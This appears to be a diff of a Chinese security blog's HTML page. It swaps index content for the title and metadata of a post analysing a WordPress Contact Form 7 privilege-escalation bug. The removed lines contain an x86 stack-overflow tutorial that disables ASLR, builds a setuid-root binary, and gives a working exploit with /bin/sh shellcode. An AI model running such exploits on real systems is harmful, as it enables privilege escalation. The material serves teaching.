@@ -5,15 +5,26 @@
   
 
   
-  <title>i9n0re 博客</title>
+  <title>wordpress contact_form_7_v5.0.3 插件 权限提升、任意文件读取漏洞分析 | i9n0re 博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="i9n0re 博客">
-<meta property="og:url" content="https://i9n0re.github.io/index.html">
+  <meta name="description" content="简介看到了国外有大佬发了关于WordPress的一个非常有名的插件，contact form 7的漏洞，之前见到过很多WordPress站点使用这个插件，大佬写的比较笼统，一些详细的利用方式没有说的太明白. 漏洞成因这个漏洞是由于插件开发者对WordPress的使用不当造成的，其实跟WordPress的逻辑有一定的关系，导致了可以发布普通文章的用户，可以绕过权限认证，进行发表原本插件作者只允许管理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wordpress contact_form_7_v5.0.3 插件 权限提升、任意文件读取漏洞分析">
+<meta property="og:url" content="https://i9n0re.github.io/2018/12/22/wordpress-contact-form-7-v5-0-3-插件-权限提升、任意文件读取漏洞分析/index.html">
 <meta property="og:site_name" content="i9n0re 博客">
+<meta property="og:description" content="简介看到了国外有大佬发了关于WordPress的一个非常有名的插件，contact form 7的漏洞，之前见到过很多WordPress站点使用这个插件，大佬写的比较笼统，一些详细的利用方式没有说的太明白. 漏洞成因这个漏洞是由于插件开发者对WordPress的使用不当造成的，其实跟WordPress的逻辑有一定的关系，导致了可以发布普通文章的用户，可以绕过权限认证，进行发表原本插件作者只允许管理">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://i9n0re.github.io/2018/12/22/wordpress-contact-form-7-v5-0-3-插件-权限提升、任意文件读取漏洞分析/media/15455393611905.jpg">
+<meta property="og:image" content="https://i9n0re.github.io/2018/12/22/wordpress-contact-form-7-v5-0-3-插件-权限提升、任意文件读取漏洞分析/media/15455394346116.jpg">
+<meta property="og:image" content="https://i9n0re.github.io/2018/12/22/wordpress-contact-form-7-v5-0-3-插件-权限提升、任意文件读取漏洞分析/media/15455670785788.jpg">
+<meta property="og:image" content="https://i9n0re.github.io/2018/12/22/wordpress-contact-form-7-v5-0-3-插件-权限提升、任意文件读取漏洞分析/media/15455738685995.jpg">
+<meta property="og:image" content="https://i9n0re.github.io/2018/12/22/wordpress-contact-form-7-v5-0-3-插件-权限提升、任意文件读取漏洞分析/media/15455744357869.jpg">
+<meta property="og:image" content="https://i9n0re.github.io/2018/12/22/wordpress-contact-form-7-v5-0-3-插件-权限提升、任意文件读取漏洞分析/media/15456354237434.jpg">
+<meta property="og:updated_time" content="2018-12-24T07:10:57.979Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="i9n0re 博客">
+<meta name="twitter:title" content="wordpress contact_form_7_v5.0.3 插件 权限提升、任意文件读取漏洞分析">
+<meta name="twitter:description" content="简介看到了国外有大佬发了关于WordPress的一个非常有名的插件，contact form 7的漏洞，之前见到过很多WordPress站点使用这个插件，大佬写的比较笼统，一些详细的利用方式没有说的太明白. 漏洞成因这个漏洞是由于插件开发者对WordPress的使用不当造成的，其实跟WordPress的逻辑有一定的关系，导致了可以发布普通文章的用户，可以绕过权限认证，进行发表原本插件作者只允许管理">
+<meta name="twitter:image" content="https://i9n0re.github.io/2018/12/22/wordpress-contact-form-7-v5-0-3-插件-权限提升、任意文件读取漏洞分析/media/15455393611905.jpg">
   
     <link rel="alternate" href="/atom.xml" title="i9n0re 博客" type="application/atom+xml">
   
@@ -60,9 +71,7 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-wordpress-contact-form-7-v5-0-3-插件-权限提升、任意文件读取漏洞分析" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <section id="main"><article id="post-wordpress-contact-form-7-v5-0-3-插件-权限提升、任意文件读取漏洞分析" class="article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/12/22/wordpress-contact-form-7-v5-0-3-插件-权限提升、任意文件读取漏洞分析/" class="article-date">
   <time datetime="2018-12-22T15:09:46.000Z" itemprop="datePublished">2018-12-22</time>
@@ -75,8 +84,8 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/22/wordpress-contact-form-7-v5-0-3-插件-权限提升、任意文件读取漏洞分析/">wordpress contact_form_7_v5.0.3 插件 权限提升、任意文件读取漏洞分析</a>
+    <h1 class="article-title" itemprop="name">
+      wordpress contact_form_7_v5.0.3 插件 权限提升、任意文件读取漏洞分析
     </h1>
   
 
@@ -130,121 +139,19 @@
     </footer>
   </div>
   
-</article>
-
-
+    
+<nav id="article-nav">
   
-    <article id="post-easy-x86-exploit" class="article article-type-post" itemscope="" itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/11/06/easy-x86-exploit/" class="article-date">
-  <time datetime="2018-11-06T13:33:01.000Z" itemprop="datePublished">2018-11-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/06/easy-x86-exploit/">easy x86 exploit</a>
-    </h1>
+    <a href="/2018/11/06/easy-x86-exploit/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">easy x86 exploit</div>
+    </a>
   
+</nav>
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="x86-exploit"><a href="#x86-exploit" class="headerlink" title="x86 exploit"></a>x86 exploit</h1><h2 id="basic-vlun"><a href="#basic-vlun" class="headerlink" title="basic vlun"></a>basic vlun</h2><h3 id="最简单的栈溢出"><a href="#最简单的栈溢出" class="headerlink" title="最简单的栈溢出"></a>最简单的栈溢出</h3><h4 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h4><p>简单来说，就是输入的字符串长度超过了目标字符串长度限制，并且没有长度检测，导致了溢出。</p>
-<h4 id="溢出类型"><a href="#溢出类型" class="headerlink" title="溢出类型"></a>溢出类型</h4><ul>
-<li>栈溢出(Stack Based Buffer Overflow)</li>
-<li>堆溢出(Heap Based Buffer Overflow)</li>
-</ul>
-<h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>漏洞代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//vuln.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">        /* [1] */ char buf[256];</span><br><span class="line">        /* [2] */ strcpy(buf,argv[1]);</span><br><span class="line">        /* [3] */ printf(&quot;Input:%s\n&quot;,buf);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>编译代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">关闭aslr，地址空间布局随机化</span><br><span class="line"></span><br><span class="line">gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</span><br><span class="line"></span><br><span class="line">-fno-stack-protector关闭堆栈保护</span><br><span class="line">-z execstack 关闭NX（DEP）数据执行保护</span><br><span class="line"></span><br><span class="line">sudo chown root vuln</span><br><span class="line">sudo chgrp root vuln</span><br><span class="line">sudo chmod +s vuln</span><br></pre></td></tr></table></figure></p>
-<p>然后通过返回地址覆盖的方法进行攻击。<br>exp.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import struct</span><br><span class="line">from subprocess import call</span><br><span class="line"></span><br><span class="line">#Stack address where shellcode is copied.</span><br><span class="line">ret_addr = 0xbffff5a0</span><br><span class="line"></span><br><span class="line">#Spawn a shell</span><br><span class="line">#execve(/bin/sh)</span><br><span class="line">scode = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">#endianess convertion</span><br><span class="line">def conv(num):</span><br><span class="line"> return struct.pack(&quot;&lt;I&quot;,num)</span><br><span class="line">buf = &quot;A&quot; * 268</span><br><span class="line">buf += conv(ret_addr)</span><br><span class="line">buf += &quot;\x90&quot; * 100</span><br><span class="line">buf += scode</span><br><span class="line"></span><br><span class="line">print &quot;Calling vulnerable program&quot;</span><br><span class="line">call([&quot;./vuln&quot;, buf])</span><br></pre></td></tr></table></figure></p>
-<p>寻找返回地址，通过core文件<br>ulimit -c unlimited<br>sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’<br>再次触发漏洞代码，会在tmp文件夹下面产生core文件，用gdb调试这个core文件，gdb vuln </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://i9n0re.github.io/2018/11/06/easy-x86-exploit/" data-id="cjq1zh93s0000lqxc3j6eewim" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
   
 </article>
-
-
-  
-    <article id="post-关于国密-（sm2-sm3-sm4）在Linux、python、Android、java、ios中的应用" class="article article-type-post" itemscope="" itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/11/06/关于国密-（sm2-sm3-sm4）在Linux、python、Android、java、ios中的应用/" class="article-date">
-  <time datetime="2018-11-06T13:31:09.000Z" itemprop="datePublished">2018-11-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/06/关于国密-（sm2-sm3-sm4）在Linux、python、Android、java、ios中的应用/">关于国密 （sm2,sm3,sm4）在Linux、python、Android、java、ios中的应用</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="关于国密开源库（GmSSL）在Linux、python、Android、java、ios中的应用"><a href="#关于国密开源库（GmSSL）在Linux、python、Android、java、ios中的应用" class="headerlink" title="关于国密开源库（GmSSL）在Linux、python、Android、java、ios中的应用"></a>关于国密开源库（GmSSL）在Linux、python、Android、java、ios中的应用</h1><h2 id="什么是国密？"><a href="#什么是国密？" class="headerlink" title="什么是国密？"></a>什么是国密？</h2><p>国密即国家密码局认定的国产密码算法。主要有SM1，SM2，SM3，SM4和最新的sm9。在国内环境主要使用的国家密码局认定的算法。</p>
-<p>SM2算法：SM2椭圆曲线公钥密码算法是我国自主设计的公钥密码算法，包括SM2-1椭圆曲线数字签名算法，SM2-2椭圆曲线密钥交换协议，SM2-3椭圆曲线公钥加密算法，分别用于实现数字签名密钥协商和数据加密等功能。SM2算法与RSA算法不同的是，SM2算法是基于椭圆曲线上点群离散对数难题，相对于RSA算法，256位的SM2密码强度已经比2048位的RSA密码强度要高。</p>
-<p><strong>其实就是类似RSA算法，但是大家都知道，RSA算法位数要求已经在2048以上了，SM2不同的是可以使用较少的位数保证较强的密码强度。</strong></p>
-<p>SM3算法，SM3杂凑算法是我国自主设计的密码杂凑算法，适用于商用密码应用中的数字签名和验证消息认证码的生成与验证以及随机数的生成，可满足多种密码应用的安全需求。为了保证杂凑算法的安全性，其产生的杂凑值的长度不应太短，例如MD5输出128比特杂凑值，输出长度太短，影响其安全性SHA-1算法的输出长度为160比特，SM3算法的输出长度为256比特，因此SM3算法的安全性要高于MD5算法和SHA-1算法。</p>
-<p><strong>与md5相似，但是比md5更长，具有更高的安全性。</strong></p>
-<p>SM4算法：分组密码算法是我国自主设计的分组对称密码算法，用于实现数据的加密/解密运算，以保证数据和信息的机密性。要保证一个对称密码算法的安全性的基本条件是其具备足够的密钥长度，SM4算法与AES算法具有相同的密钥长度分组长度128比特，因此在安全性上高于3DES算法。</p>
-<p><strong>与AES相似。</strong></p>
-<p>SM9算法：是由国密局发布的一种IBE(Identity-Based Encryption)算法。IBE算法以用户的身份标识作为公钥，不依赖于数字证书。</p>
-<p><strong>一种新型的公私钥算法，基于身份标识的。</strong></p>
-<h2 id="openssl的编程初探"><a href="#openssl的编程初探" class="headerlink" title="openssl的编程初探"></a>openssl的编程初探</h2><p>在算法实现中，不免要使用openssl库来进行操作，openssl 很强大，提供了健壮的，全功能的加密套件。</p>
-<p><a href="https://www.openssl.org/" target="_blank" rel="noopener">openssl官网</a></p>
-<p>有兴趣的同学可以详细去学习下，openssl有着大量的API可以使用，可以实现大量的密码算法。</p>
-<h2 id="开源算法（gmsll-org）"><a href="#开源算法（gmsll-org）" class="headerlink" title="开源算法（gmsll.org）"></a>开源算法（gmsll.org）</h2><p>这里我使用的是北京大学<a href="https://github.com/guanzhi" target="_blank" rel="noopener">关志</a>副研究员的密码学研究组开发维护的<a href="http://gmssl.org/" target="_blank" rel="noopener">GmSSL</a>,此项目上openssl的分支，可以替代openssl，并增加了对国密的支持.</p>
-<p>在网上找了很多关于此开源库的使用方法，都不是很明白，我对这个项目的使用方法做一个总结，可以支持在多个平台上使用。</p>
-<h2 id="下面我们来看看具体的使用方法"><a href="#下面我们来看看具体的使用方法" class="headerlink" title="下面我们来看看具体的使用方法"></a>下面我们来看看具体的使用方法</h2><p>示例代码可以在<a href="">github</a>上面可以下载得到，给出了测试代码，可以直接进行下载调试，主要实现的是<strong>sm2的加解密</strong>，<strong>sm4的加解密</strong>，欢迎star。<br>使用方法都是：</p>
-<ol>
-<li>编译GmSSL库，得到对应的文件。</li>
-<li>引用文件。</li>
-<li>使用对应语言调用。</li>
-</ol>
-<p>编译环境为（macbook + ubuntu虚拟机）</p>
-<h3 id="evp-api"><a href="#evp-api" class="headerlink" title="evp api"></a>evp api</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>首先是 <strong>EVP API</strong>，这是对GmSSL接口的一个封装，隐藏了API实现的细节，提供了一个抽象的，统一的接口。我们可以借助这个接口来实现其他平台的使用。</p>
-<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>我在Ubuntu环境下面<br><code>./config</code><br><code>make</code><br>make成功后，生成 libcrypto.so.1.1 和 libssl.so.1.1<br>在code文件夹下面，编写自己的sm4.c,utils.c,sm2.c<br>然后利用下面的代码进行编译。<br><code>gcc -Wall code/sm4.c code/sm2.c code/utils.c -o my_gmssl -lssl -lcrypto -L. -I include -I apps -I . -L /usr/lib/ssl</code></p>
-<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>编写测试代码：<br><img src="media/15426078151794.jpg" alt="-w652"></p>
-<p>运行结果：<br><img src="media/15426077534504.jpg" alt="-w698"><br>测试成功。</p>
-<h3 id="java-API的使用方法（Android）"><a href="#java-API的使用方法（Android）" class="headerlink" title="java API的使用方法（Android）"></a>java API的使用方法（Android）</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>在Android里面调用这个库的方法，主要是通过编译.so动态链接库的方式进行引用。在官方的<a href="https://github.com/guanzhi/GmSSL/blob/master/java/" target="_blank" rel="noopener">github</a>中，已经给出了相关代码，但是缺少了ndk编译过程。</p>
-<h4 id="编译-1"><a href="#编译-1" class="headerlink" title="编译"></a>编译</h4><h4 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h4><p>有些手机里面并不支持，.so.1.1的soname，所以在引用libssl.so.1.1 和libcrypto.so.1.1的时候出现了问题，解决方法是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readelf -d libssl.so</span><br><span class="line">rpl -R -e .so.1.1 &quot;_1_1.so&quot; libcrypto.so</span><br><span class="line">rpl -R -e .so.1.1 &quot;_1_1.so&quot; libssl.so</span><br></pre></td></tr></table></figure></p>
-<h3 id="python-调用方法"><a href="#python-调用方法" class="headerlink" title="python 调用方法"></a>python 调用方法</h3><h4 id="坑-1"><a href="#坑-1" class="headerlink" title="坑"></a>坑</h4><p>当使用memcpy或者strcpy进行复制结果字符串时，在c语言里面运行正常，但是引入到python里面的时候会出现多一位或几位字符的情况，所以输出结果转换成了16进制字符串，这样结果就稳定了。</p>
-<h3 id="ios使用方法"><a href="#ios使用方法" class="headerlink" title="ios使用方法"></a>ios使用方法</h3><h3 id="nodejs使用方法"><a href="#nodejs使用方法" class="headerlink" title="nodejs使用方法"></a>nodejs使用方法</h3><h4 id="坑-2"><a href="#坑-2" class="headerlink" title="坑"></a>坑</h4><p>c++ 编译bug，sm2 bug</p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://i9n0re.github.io/2018/11/06/关于国密-（sm2-sm3-sm4）在Linux、python、Android、java、ios中的应用/" data-id="cjq1zh9450001lqxccg4kvilk" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
 
 </section>
         
